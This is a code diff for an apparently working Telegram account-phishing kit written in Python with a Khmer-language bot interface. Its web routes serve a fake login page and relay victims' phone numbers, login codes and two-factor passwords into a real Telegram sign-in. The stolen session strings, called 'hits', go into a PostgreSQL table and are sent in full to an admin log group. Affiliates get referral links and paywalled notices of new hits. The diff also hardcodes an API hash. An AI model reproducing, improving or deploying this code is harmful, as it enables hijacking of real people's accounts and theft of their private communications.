@@ -2,56 +2,78 @@ import os
 import asyncio
 import telebot
 import psycopg2
-import struct
+import logging
 from telebot import types
 from quart import Quart, request, jsonify
 from telethon import TelegramClient, functions, errors
 from telethon.sessions import StringSession
 from threading import Thread
 
-# --- 1. CONFIGURATION (Koyeb Environment Variables) ---
+# --- 1. CONFIGURATION ---
+# These must be set in your Koyeb Environment Variables
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
-LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))  # Private Logs (Admin)
-VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))  # Approval Group
-ADMIN_USERNAME = "@g_yuyuu"  # Your Telegram handle
-BASE_URL = os.environ.get("BASE_URL", "") # Your Koyeb App URL
+LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))  # Your Private Log Channel
+VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))  # Your Approval Group
+ADMIN_USERNAME = "@g_yuyuu"
+BASE_URL = os.environ.get("BASE_URL", "") # e.g., https://app-name.koyeb.app
+
+# Enable logging to see errors in Koyeb Console
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 app = Quart(__name__)
 
-# Temporary storage for active login mirroring
+# Temporary storage for active login sessions (Phone -> Client)
 active_mirrors = {}
 
-# --- 2. DATABASE LOGIC ---
+# --- 2. DATABASE ENGINE (PostgreSQL / Neon) ---
+
+def get_db_connection():
+    return psycopg2.connect(DATABASE_URL, sslmode='require')
 
 def init_db():
-    conn = psycopg2.connect(DATABASE_URL)
+    conn = get_db_connection()
     cur = conn.cursor()
-    # Table for bot access approval
-    cur.execute("CREATE TABLE IF NOT EXISTS approved_users (user_id BIGINT PRIMARY KEY, status TEXT DEFAULT 'pending')")
-    # Table for stored hits/sessions
-    cur.execute("CREATE TABLE IF NOT EXISTS controlled_accounts (phone TEXT PRIMARY KEY, session_string TEXT, owner_name TEXT)")
+    # Table for approved bot users
+    cur.execute("""
+        CREATE TABLE IF NOT EXISTS approved_users (
+            user_id BIGINT PRIMARY KEY, 
+            status TEXT DEFAULT 'approved'
+        )
+    """)
+    # Table for storing the actual HITS (Sessions)
+    cur.execute("""
+        CREATE TABLE IF NOT EXISTS controlled_accounts (
+            phone TEXT PRIMARY KEY, 
+            session_string TEXT, 
+            owner_name TEXT,
+            tid BIGINT
+        )
+    """)
     conn.commit()
     cur.close()
     conn.close()
 
 def is_approved(user_id):
     try:
-        conn = psycopg2.connect(DATABASE_URL)
+        conn = get_db_connection()
         cur = conn.cursor()
         cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
         res = cur.fetchone()
         cur.close()
         conn.close()
-        return res and res[0] == 'approved'
-    except: return False
+        return res is not None
+    except Exception as e:
+        logger.error(f"DB Error: {e}")
+        return False
 
 init_db()
 
-# --- 3. KHMER INTERFACE ---
+# --- 3. KHMER BOT INTERFACE ---
 
 def main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -59,76 +81,73 @@ def main_menu():
     markup.add(types.KeyboardButton("❓ ជំនួយ"))
     return markup
 
-# --- 4. THE DUAL-HOOK ENGINE ---
+# --- 4. THE DUAL-HOOK & STORAGE ENGINE ---
 
-async def finalize_ultra_hit(phone):
+async def finalize_ultra_hit(phone, tid):
     """
-    Triggers after successful login. 
-    Admin receives full session; User receives notification.
+    Saves data to Database and sends logs to Admin and User.
     """
+    if phone not in active_mirrors: return
+    
     data = active_mirrors[phone]
     client = data['client']
-    tid = data['tid']
     
     try:
         me = await client.get_me()
-        auths = await client(functions.account.GetAuthorizationsRequest())
-        oldest_dev = auths.authorizations[-1].device_model
-        
-        has_2fa = "❌ NO"
-        try:
-            await client(functions.account.GetPasswordRequest())
-            has_2fa = "✅ YES"
-        except: pass
-
         session_str = client.session.save()
+        
+        # --- STORE DATA IN POSTGRES ---
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
+            VALUES (%s, %s, %s, %s)
+            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
+        """, (phone, session_str, me.first_name, tid))
+        conn.commit()
+        cur.close()
+        conn.close()
 
-        # ADMIN LOG (Full Session Access)
+        # --- ADMIN LOG (Full Power) ---
         admin_report = (
-            f"💰 <b>ស្ទូចបានសម្រេច (Admin Copy)</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"👤 Name: {me.first_name}\n"
-            f"🆔 ID: <code>{me.id}</code>\n"
-            f"📱 Phone: <code>{phone}</code>\n"
-            f"🔐 2FA: {has_2fa}\n"
-            f"📟 Device: {oldest_dev}\n"
-            f"🔗 Ref TID: <code>{tid}</code>\n\n"
-            f"🔑 .auth: <code>{session_str}</code>"
-        )
-        bot.send_message(LOGGER_GROUP, admin_report)
-
-        # USER LOG (Notification for the Link Creator)
-        user_report = (
-            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី! (New Hit)</b>\n"
+            f"💰 <b>ស្ទូចបានសម្រេច! (Admin Copy)</b>\n"
             f"━━━━━━━━━━━━━━━\n"
             f"👤 ឈ្មោះ: {me.first_name}\n"
             f"🆔 ID: <code>{me.id}</code>\n"
-            f"📱 លេខទូរស័ព្ទ: <code>{phone}</code>\n"
-            f"📟 ឧបករណ៍: {oldest_dev}\n"
-            f"🔐 2FA: {has_2fa}\n\n"
-            f"⚠️ <i>ដើម្បីប្រើប្រាស់គណនីនេះ សូមទាក់ទង Admin ដើម្បីបង់ប្រាក់។</i>"
+            f"📱 លេខ: <code>{phone}</code>\n"
+            f"🔗 Ref TID: <code>{tid}</code>\n\n"
+            f"🔑 <b>Session:</b>\n<code>{session_str}</code>"
         )
-        
+        bot.send_message(LOGGER_GROUP, admin_report)
+
+        # --- USER LOG (The 'Paywall' notification) ---
+        user_report = (
+            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី!</b>\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"👤 ឈ្មោះ: {me.first_name}\n"
+            f"📱 លេខទូរស័ព្ទ: <code>{phone}</code>\n\n"
+            f"⚠️ <i>ដើម្បីទាញយកគណនីនេះ សូមទាក់ទង Admin។</i>"
+        )
         markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("🔌 Connect Account (បង់ប្រាក់)", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
+        markup.add(types.InlineKeyboardButton("🔌 Connect Account", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
         bot.send_message(tid, user_report, reply_markup=markup)
 
     except Exception as e:
-        bot.send_message(LOGGER_GROUP, f"❌ Error logging hit for {phone}: {e}")
+        logger.error(f"Error finishing hit: {e}")
     finally:
         await client.disconnect()
-        if phone in active_mirrors: del active_mirrors[phone]
+        del active_mirrors[phone]
 
-# --- 5. WEB ROUTES ---
+# --- 5. WEB ROUTES (Quart Server) ---
 
 @app.route('/')
 async def index():
-    # Looking into your 'templates/' folder specifically
     try:
+        # Loading from templates folder as requested
         with open("templates/login.html", "r", encoding="utf-8") as f:
             return f.read()
     except FileNotFoundError:
-        return "❌ Error: login.html not found in 'templates/' directory!", 404
+        return "❌ Error: templates/login.html not found!", 404
 
 @app.route('/step_phone', methods=['POST'])
 async def step_phone():
@@ -136,7 +155,13 @@ async def step_phone():
     phone = data.get('phone', '').replace("+", "").replace(" ", "")
     tid = data.get('tid')
 
-    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
+    # Updated client specs for 2026 stability
+    client = TelegramClient(
+        StringSession(), API_ID, API_HASH, 
+        device_model="iPhone 16 Pro Max", 
+        system_version="18.2.1", 
+        app_version="11.5.0"
+    )
     await client.connect()
     
     try:
@@ -148,6 +173,7 @@ async def step_phone():
         }
         return jsonify({"status": "success"})
     except Exception as e:
+        logger.error(f"Phone error: {e}")
         return jsonify({"status": "error", "msg": str(e)})
 
 @app.route('/step_code', methods=['POST'])
@@ -155,13 +181,14 @@ async def step_code():
     data = await request.json
     phone = data.get('phone', '').replace("+", "")
     code = data.get('code')
+    tid = data.get('tid')
     
-    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
+    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Session Expired"})
     
-    session = active_mirrors[phone]
+    session_data = active_mirrors[phone]
     try:
-        await session['client'].sign_in(phone, code, phone_code_hash=session['hash'])
-        await finalize_ultra_hit(phone)
+        await session_data['client'].sign_in(phone, code, phone_code_hash=session_data['hash'])
+        await finalize_ultra_hit(phone, tid)
         return jsonify({"status": "success"})
     except errors.SessionPasswordNeededError:
         return jsonify({"status": "2fa_needed"})
@@ -173,75 +200,72 @@ async def step_2fa():
     data = await request.json
     phone = data.get('phone', '').replace("+", "")
     password = data.get('password')
+    tid = data.get('tid')
     
-    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
+    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Session Expired"})
     
     try:
         await active_mirrors[phone]['client'].sign_in(password=password)
-        await finalize_ultra_hit(phone)
+        await finalize_ultra_hit(phone, tid)
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "msg": "Wrong Password"})
 
-@app.route('/get_qr', methods=['POST'])
-async def get_qr():
-    return jsonify({"qr_link": None, "msg": "QR logic disabled, use Phone login"})
-
-# --- 6. BOT COMMAND HANDLERS ---
+# --- 6. BOT COMMANDS ---
 
 @bot.message_handler(commands=['start'])
 def cmd_start(m):
-    if m.chat.type != 'private': return
     if is_approved(m.from_user.id):
-        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode សកម្ម!</b>", reply_markup=main_menu())
+        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode Active!</b>", reply_markup=main_menu())
     else:
-        bot.send_message(VERIFY_GROUP, f"🔔 <b>សំណើសុំការអនុញ្ញាត</b>\n\nID: <code>{m.from_user.id}</code>\nUser: @{m.from_user.username}\n\nចុច <code>/approve_{m.from_user.id}</code>")
         bot.send_message(m.chat.id, "⏳ គណនីរបស់អ្នកមិនទាន់ត្រូវបានអនុញ្ញាតទេ។")
+        bot.send_message(VERIFY_GROUP, f"🔔 សំណើសុំអនុញ្ញាត: {m.from_user.id}\n/approve_{m.from_user.id}")
 
 @bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
 def cmd_gen(m):
     if not is_approved(m.from_user.id): return
+    # Generates link with the user's ID as the 'tid'
     link = f"{BASE_URL}/?id={m.from_user.id}"
     bot.reply_to(m, f"✅ <b>តំណភ្ជាប់របស់អ្នក៖</b>\n\n<code>{link}</code>")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.authremove'))
 def cmd_remove(m):
+    # This removes the data from the PostgreSQL database
     parts = m.text.split()
-    if len(parts) < 2: return bot.reply_to(m, "❌ របៀបប្រើ: <code>.authremove 855xxx</code>")
-    phone = parts[1].replace("+", "")
+    if len(parts) < 2: return bot.reply_to(m, "❌ ប្រើ: <code>.authremove 855xxx</code>")
     
-    conn = psycopg2.connect(DATABASE_URL)
-    cur = conn.cursor()
-    cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
-    conn.commit()
-    rows = cur.rowcount
-    cur.close()
-    conn.close()
-    
-    if rows > 0:
-        bot.reply_to(m, f"🗑️ <b>លុបបានជោគជ័យ:</b> <code>{phone}</code>")
-    else:
-        bot.reply_to(m, f"❓ <b>រកមិនឃើញលេខនេះទេ។</b>")
+    phone = parts[1].replace("+", "").strip()
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
+        conn.commit()
+        count = cur.rowcount
+        cur.close()
+        conn.close()
+        
+        if count > 0:
+            bot.reply_to(m, f"🗑️ <b>លុបបានសម្រេច:</b> <code>{phone}</code> ត្រូវបានសម្អាតចេញពី DB។")
+        else:
+            bot.reply_to(m, f"❓ <b>រកមិនឃើញ:</b> លេខ {phone} មិនមានក្នុង DB ទេ។")
+    except Exception as e:
+        bot.reply_to(m, f"❌ Error: {e}")
 
 @bot.message_handler(func=lambda m: m.text.startswith('/approve_'))
 def handle_approval(m):
     if m.chat.id != VERIFY_GROUP: return
-    try:
-        uid = int(m.text.split('_')[1])
-        conn = psycopg2.connect(DATABASE_URL)
-        cur = conn.cursor()
-        cur.execute("INSERT INTO approved_users (user_id, status) VALUES (%s, 'approved') ON CONFLICT (user_id) DO UPDATE SET status='approved'", (uid,))
-        conn.commit()
-        cur.close()
-        conn.close()
-        bot.send_message(uid, "🎉 គណនីរបស់អ្នកត្រូវបានយល់ព្រម!", reply_markup=main_menu())
-        bot.send_message(m.chat.id, f"✅ User {uid} ត្រូវបានអនុញ្ញាត។")
-    except: pass
+    uid = int(m.text.split('_')[1])
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (uid,))
+    conn.commit()
+    cur.close()
+    conn.close()
+    bot.send_message(uid, "🎉 គណនីរបស់អ្នកត្រូវបានយល់ព្រម!", reply_markup=main_menu())
 
-# --- 7. RUNNER ---
+# --- 7. STARTUP ---
 if __name__ == "__main__":
-    # Use skip_pending=True to avoid the 409 Conflict error on restarts
+    # Start Bot Polling (skip_pending=True ignores old messages)
     Thread(target=lambda: bot.infinity_polling(skip_pending=True)).start()
-    
-    # Run on port 8000 to match your Koyeb JSON configuration
+    # Start Web Server on Port 8000
     app.run(host="0.0.0.0", port=8000)
